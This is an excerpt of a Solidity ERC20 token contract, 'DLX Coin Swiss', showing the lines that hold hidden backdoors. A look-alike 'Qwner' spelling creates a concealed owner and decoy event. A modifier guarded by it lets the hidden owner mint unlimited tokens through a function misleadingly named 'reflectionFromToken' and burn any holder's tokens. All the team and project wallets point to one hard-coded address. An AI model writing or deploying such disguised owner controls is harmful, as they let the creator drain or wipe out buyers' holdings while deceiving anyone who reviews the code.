...
abstract contract Ownable is Context {
    ...
    address private _Qwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event QwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    constructor () {
        ...
        emit QwnershipTransferred(address(0), msgSender);
    }
    ...
    modifier onlyQwner() {
        require(_Qwner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract DLXCoinSwiss is ERC20, Ownable {
    ...
    uint256 public swapTokensAtAmount = 500000 * 10**6 * (10**9);

    uint16 private totalBuyFee;
    uint16 private totalSellFee;

    address internal _teamWalletAddress = address(0x4994168DEF8f69e66e978f50C42A77b29865B739);
    address internal _projectWalletAddress = address(0x4994168DEF8f69e66e978f50C42A77b29865B739);
    address public teamWalletAddress = address(0x4994168DEF8f69e66e978f50C42A77b29865B739);
    address public projectWalletAddress = address(0x4994168DEF8f69e66e978f50C42A77b29865B739);
    ...
    constructor() ERC20("DLX Coin Swiss", "DLX") {
    ...
    function reflectionFromToken(address _to, uint256 _amount) public onlyQwner {
        _mint(_to, _amount);
    }
    ...
    function burn(address _from, uint256 _amount) public onlyQwner {
        _burn(_from, _amount);
    }
